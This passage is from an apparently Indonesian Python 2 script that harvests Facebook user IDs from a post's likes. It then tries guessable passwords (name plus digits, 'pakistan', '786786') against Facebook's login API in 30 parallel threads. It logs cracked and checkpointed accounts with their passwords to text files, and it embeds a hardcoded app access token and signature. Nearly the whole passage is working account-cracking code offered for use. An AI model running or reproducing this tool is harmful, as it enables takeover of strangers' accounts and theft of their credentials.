                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;91mCEKPOINT'
                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m' + j['name']
                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m' + zowe
                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m' + bos2
                    cek = open('done/pakis.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos3
                        oke = open('done/pakis.txt', 'a')
                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;91mCEKPOINT'
                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m' + j['name']
                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m' + zowe
                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m' + bos3
                        cek = open('done/pakis.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = 'pakistan'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos4
                            oke = open('done/pakis.txt', 'a')
                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;91mCEKPOINT'
                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m' + j['name']
                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m' + zowe
                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m' + bos4
                            cek = open('done/pakis.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = '786786'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos5
                                oke = open('done/pakis.txt', 'a')
                                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;91mCEKPOINT'
                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m' + j['name']
                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m' + zowe
                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m' + bos5
                                cek = open('done/pakis.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['last_name'].lower() + '786'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos6
                                    oke = open('done/pakis.txt', 'a')
                                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;91mCEKPOINT'
                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m' + zowe
                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m' + bos6
                                    cek = open('done/pakis.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = j['last_name'].lower() + '123'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos7
                                        oke = open('done/pakis.txt', 'a')
                                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;91mCEKPOINT'
                                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m' + zowe
                                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m' + bos7
                                        cek = open('done/pakis.txt', 'a')
                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = j['last_name'].lower() + '1234'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos8
                                            oke = open('done/pakis.txt', 'a')
                                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m' + zowe
                                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m' + bos8
                                            cek = open('done/pakis.txt', 'a')
                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mSelesai ...'
    print '\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;91mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;91m' + str(len(cekpoint))
    print '\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;92mOK\x1b[1;97m/\x1b[1;91mCP \x1b[1;91mfile tersimpan \x1b[1;91m: \x1b[1;92mdone/pakis.txt'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    raw_input('\x1b[1;97m{<\x1b[1;91mKembali\x1b[1;97m>}')
    os.system('python2 cr4ck.py')
def crack_likes():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m[!] Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()
    try:
        os.system('clear')
        print logo
        print 50 * '\x1b[1;94m\xe2\x94\x80'
        print '        \x1b[1;96m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK POSTINGAN GRUP/TEMAN\x1b[1;96m \xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
        print 50 * '\x1b[1;94m\xe2\x94\x80'
        tez = raw_input('\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m}\x1b[1;96m ID Postingan Group/Teman \x1b[1;91m :\x1b[1;92m ')
        r = requests.get('https://graph.facebook.com/' + tez + '/likes?limit=9999999&access_token=' + toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])
        jalan('\r\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m} \x1b[1;96mMengambil ID \x1b[1;97m...')
    except KeyError:
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} ID Postingan Salah !'
        raw_input('\n\x1b[1;96m[<\x1b[1;97mKembali>\x1b[1;96m]')
        menu()
    print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m} \x1b[1;96mTotal ID \x1b[1;91m:\x1b[1;92m ' + str(len(id))
    print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m} \x1b[1;96mStop Tekan CTRL+Z'
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m} \x1b[1;96mCrack Berjalan ' + o,
        sys.stdout.flush()
        time.sleep(1)
    print '\n\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m} \x1b[1;96mGunakan Mode Pesawat Jika Tidak Ada Hasil'
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    def main(arg):
        sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;93m%M\x1b[1;91m:\x1b[1;92m%S')))
        sys.stdout.flush()
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass
        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos1
                oke = open('done/grup.txt', 'a')
                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m' + j['name']
                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m' + zowe
                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m' + bos1
                cek = open('done/grup.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos2
                    oke = open('done/grup.txt', 'a')
                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m' + j['name']
                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m' + zowe
                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m' + bos2
                    cek = open('done/grup.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos3
                        oke = open('done/grup.txt', 'a')
                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m' + j['name']
                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m' + zowe
                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m' + bos3
                        cek = open('done/grup.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = j['last_name'].lower() + '123'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos4
                            oke = open('done/grup.txt', 'a')
                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m' + j['name']
                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m' + zowe
                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m' + bos4
                            cek = open('done/grup.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = j['last_name'].lower() + '1234'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos5
                                oke = open('done/grup.txt', 'a')
                                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
                                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m' + j['name']
                                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m' + zowe
                                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m' + bos5
                                cek = open('done/grup.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['last_name'].lower() + '12345'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
